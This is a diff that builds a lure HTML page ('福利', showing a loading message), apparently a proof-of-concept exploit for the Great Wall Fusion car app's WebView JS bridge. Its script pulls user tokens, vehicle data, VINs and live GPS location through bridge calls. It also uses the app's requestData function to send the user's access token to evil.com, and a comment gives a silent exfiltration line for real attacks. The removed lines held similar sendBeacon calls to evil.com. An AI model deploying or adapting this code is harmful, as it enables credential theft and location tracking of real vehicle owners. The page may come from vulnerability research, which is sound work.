@@ -1,18 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>福利</title></head>
+<body>
+<h3>正在加载…</h3>
 <script>
-// 1. 窃取设备 + 车辆信息
-let info = window.Controller.appInfo({});
-let cars = window.Controller.getAllCarsInfo({});
-let vin = window.Controller.defaultCarVin({});
-navigator.sendBeacon('https://evil.com/collect', JSON.stringify({info,cars,vin}));
+/* 长城 Fusion App WebView 注入了 4 个命名空间(NativeController/Controller/Storage/GwmController)
+   底层是 dsbridge,入口对象 window._dsb / window._dsbridge。
+   全程无 origin 校验 —— 攻击者页面与官方页面同等权限。 */
 
-// 2. 任意路由拉起敏感页面
-window.Controller.pushNativeController({url:"sapp://app/account/xxx"});
+function dsbCall(method, arg, cb) {
+  arg = arg === undefined ? null : arg;
+  if (typeof cb === 'function') {
+    // 异步带回调
+    try { return _dsb.call(method, arg, cb); } catch(e) {}
+    try { return _dsbridge.call(method, arg, cb); } catch(e) {}
+  } else {
+    // 同步取返回值
+    try { return _dsb.call(method, arg); } catch(e) {}
+    try { return _dsbridge.call(method, arg); } catch(e) {}
+  }
+  return null;
+}
 
-// 3. 越权 HTTP 请求（借 App token）
-window.Controller.requestData({
-  hostType:"ntsp", method:"get", host:"https://api.gwm.com", url:"/sensitive/endpoint"
-}, function(res){ navigator.sendBeacon('https://evil.com/exfil', JSON.stringify(res)); });
+var loot = [];
 
-// 4. 申请相机/录音权限
-window.Controller.requestPermission({permissionType:2});
+/* ① 直接拿账号 token 集群 —— 无参数 */
+var u = dsbCall('userInfo');          // 同步
+loot.push('[userInfo] ' + JSON.stringify(u));
+
+/* ② 车辆 token */
+try { loot.push('[userCarInfo] ' + JSON.stringify(dsbCall('userCarInfo'))); } catch(e){}
+try { loot.push('[appInfo] ' + JSON.stringify(dsbCall('appInfo'))); } catch(e){}
+try { loot.push('[defaultCarVin] ' + JSON.stringify(dsbCall('defaultCarVin'))); } catch(e){}
+try { loot.push('[getAllCarsInfo] ' + JSON.stringify(dsbCall('getAllCarsInfo'))); } catch(e){}
+
+/* ③ GPS 实时定位 */
+dsbCall('locationInfo', {}, function(l){
+  loot.push('[locationInfo] ' + JSON.stringify(l));
+  flush();
+});
+
+/* ④ 借 App 身份越权 HTTP —— hostType 必须 ntsp/gtsp/log/xpi,
+     但 host 字段可覆盖 setBaseUrl,DefaultTokenAuthInterceptor 自动带 accessToken */
+dsbCall('requestData', {
+  method: 'get',
+  hostType: 'ntsp',
+  host: 'https://evil.com/exfil',   // 任意 host,token 照样带上
+  url: '/exfil',
+  params: {},
+  customHeader: { 'X-Exfil': '1' }
+}, function(r){
+  loot.push('[requestData 回包] ' + JSON.stringify(r));
+  flush();
+});
+
+function flush(){
+  /* 用 alert 把窃到的凭据贴出来 —— PoC 演示用。
+     实战中改成 new Image().src='https://evil.com/c?'+btoa(loot) 静默外传 */
+  alert('【长城 Fusion JSB 窃取 PoC】\n\n' + loot.join('\n\n'));
+}
+setTimeout(flush, 1500);   // 兜底弹一次
 </script>
+</body>
+</html>
